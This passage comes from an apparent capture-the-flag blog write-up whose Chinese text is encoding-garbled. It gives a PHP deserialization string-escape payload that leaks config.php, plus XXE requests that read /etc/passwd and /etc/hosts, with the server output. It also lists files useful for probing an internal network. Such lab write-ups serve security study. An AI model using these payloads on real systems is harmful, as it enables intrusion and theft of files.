class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>éœ€è¦ <code>POST</code> å››ä¸ªå‚æ•°ï¼Œå¹¶ä¸”å‘ç° å¯¹ <code>nickname</code> çš„è¿‡æ»¤ä¸å‰ä¸¤ä¸ªä¸åŒï¼Œå¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚</p>\n<p>ç„¶åå¯¹<code>$profile</code> è¿›è¡Œåºåˆ—åŒ–å¹¶ä¼ å…¥è¿‡æ»¤å‡½æ•°è¿›è¡Œè¿‡æ»¤ã€‚æˆ‘ä»¬æ¥ç€çœ‹è¿‡æ»¤å‡½æ•°</p>\n <figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å‘ç°ä» <code>where</code> -&gt; <code>hacker</code> ,é•¿åº¦å¢åŠ ï¼Œè”æƒ³åˆ°ä¹‹å‰çš„ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚</p>\n<p>æˆ‘ä»¬åœ¨æœ¬åœ°å®éªŒå¾—åˆ°åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ˜¯(æ³¨æ„å·²ç»å°†nicknameæ”¹ä¸ºæ•°ç»„)</p>\n<p><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:11:&quot;123@123.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;admin&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/5ae0c1c8a5260bc7b6648f6fbd115c35&quot;;}</code></p>\n<p>æˆ‘ä»¬æƒ³è¯»çš„æ–‡ä»¶æ˜¯ <code>config.pgp</code> ,ä¹Ÿå°±æ˜¯è¦æ·»åŠ <code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code> ,é•¿åº¦ä¸º34ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦è¿½åŠ  34 ä¸ª <code>where</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\";&#125;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">a:4:&#123;s:5:\"</span>phone<span class=\"string\">\";s:11:\"</span><span class=\"number\">12345678901</span><span class=\"string\">\";s:5:\"</span>email<span class=\"string\">\";s:8:\"</span>ss@q.com<span class=\"string\">\";s:8:\"</span>nickname<span class=\"string\">\";a:1:&#123;i:0;s:204:\"</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\"&#125;;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;s:39:\"</span>upload/<span class=\"number\">804</span>f743824c0451b2f60d81b63b6a900<span class=\"string\">\";&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>ä¹‹åæŠ“åŒ…ä¿®æ”¹ nickname ä¸ºæ•°ç»„ï¼Œå°†å€¼æ”¹ä¸ºä¸Šé¢æˆ‘ä»¬æ„é€ çš„å†…å®¹å³å¯ã€‚</p>\n<h2 id=\"real\"><a href=\"#real\" class=\"headerlink\" title=\"real\"></a>real</h2><p>12/19/2019 10:32:05 AM </p>\n<h3 id=\"php-xxe\"><a href=\"#php-xxe\" class=\"headerlink\" title=\"php_xxe\"></a>php_xxe</h3><p>libxml2 2.9.4ä¹‹å‰ç‰ˆæœ¬ï¼Œparser.c/xmlStringLenDecodeEntitieså‡½æ•°å­˜åœ¨XMLå¤–éƒ¨å®ä½“æ¼æ´ï¼Œä¸åœ¨éªŒè¯æ¨¡å¼æ—¶ï¼Œå¯ä½¿ä¸Šä¸‹æ–‡ç‹¬ç«‹çš„æ”»å‡»è€…è¯»å–ä»»æ„æ–‡ä»¶æˆ–é€ æˆæ‹’ç»æœåŠ¡ã€‚</p>\n<p>webç›®å½•./wwwåŒ…å«4ä¸ªæ–‡ä»¶ï¼š</p>\n<pre><code>$ tree .\n.\nâ”œâ”€â”€ dom.php # ç¤ºä¾‹ï¼šä½¿ç”¨DOMDocumentè§£æbody\nâ”œâ”€â”€ index.php\nâ”œâ”€â”€ SimpleXMLElement.php # ç¤ºä¾‹ï¼šä½¿ç”¨SimpleXMLElementç±»è§£æbody\nâ””â”€â”€ simplexml_load_string.php # ç¤ºä¾‹ï¼šä½¿ç”¨simplexml_load_stringå‡½æ•°è§£æbody</code></pre><p><code>dom.php</code>ã€<code>SimpleXMLElement.php</code>ã€<code>simplexml_load_string.php</code> å‡å¯è§¦å‘XXEæ¼æ´</p>\n<p><strong>requests:</strong></p>\n<pre><code>GET /SimpleXMLElement.php HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCookie: __cfduid=d592021b2a53c58ae9e47dc1c1d5fbc361564715522; track_uuid=33b0bc28-89ab-4a63-da5c-d1b3ce520ac0\nUpgrade-Insecure-Requests: 1\nX-Forwarded-For: 127.0.0.1\nCache-Control: max-age=0\nContent-Length: 163\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>HTTP/1.1 200 OK\nHost: node3.buuoj.cn:26506\nConnection: close\nX-Powered-By: PHP/7.0.30\nContent-type: text/html; charset=UTF-8\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false</code></pre><p>è¿˜å¯ä»¥è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼š</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;\n\n127.0.0.1    localhost\n::1    localhost ip6-localhost ip6-loopback\nfe00::0    ip6-localnet\nff00::0    ip6-mcastprefix\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n174.0.56.234    283819a6c89d</code></pre><p>å¸¸ç”¨çš„å†…ç½‘ IP æ–‡ä»¶<code>/etc/hosts</code> ã€ <code>/proc/net/arp</code> ã€ <code>/proc/net/fib_trie</code></p>\n","text":"BUUCTF  wpWEBWarm upæŸ¥çœ‹æºç  &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)       ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]}]}